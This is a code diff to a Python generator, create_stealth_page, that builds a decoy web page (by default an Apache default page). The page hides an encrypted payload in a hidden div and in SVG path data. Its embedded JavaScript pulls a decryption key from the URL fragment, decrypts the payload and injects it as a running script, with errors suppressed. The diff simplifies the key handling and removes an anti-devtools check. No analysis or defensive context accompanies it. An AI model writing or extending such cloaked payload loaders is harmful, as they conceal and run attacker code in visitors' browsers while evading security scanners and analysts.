@@ -111,14 +111,14 @@ def create_stealth_page(encrypted_hex, svg_path, decoy_type='apache'):
     decoy_html = DECOYS.get(decoy_type, DECOYS['apache'])()
     r_id, p_id = rand_id(), rand_id()
 
+    key_var = rand_id()
     decoder_script = f'''
 <div id="{r_id}" style="display:none">{encrypted_hex}</div>
 <svg style="position:absolute;width:0;height:0"><path id="{p_id}" d="{svg_path}"></path></svg>
 <script>
 (function(){{
-var _0x={chr(random.randint(97,122))+chr(random.randint(97,122))}=location.hash.slice(1);
-if(!_0x.{chr(random.randint(97,122))+chr(random.randint(97,122))})return;
-if(window.devtools||/./.__proto__.toString().length!==14)return;
+var {key_var}=location.hash.slice(1);
+if(!{key_var})return;
 var _=function(s){{var e=document.createElement("script");e.textContent=s;document.head.appendChild(e);}};
 var d=function(x){{var p=Array.from(x.matchAll(/L (\\d+) (\\d+)/g));return p.map(function(m){{return((parseInt(m[1])-148).toString(16))}}).join("");}};
 var c=async function(h,k){{
@@ -139,7 +139,7 @@ return new TextDecoder().decode(O.slice(4,4+L));
 try{{
 var R=document.getElementById("{p_id}").getAttribute("d");
 var X=d(R);
-var S=await c(X,_0x.{chr(random.randint(97,122))+chr(random.randint(97,122))});
+var S=await c(X,{key_var});
 _(S);
 }}catch(e){{}}
 }})();
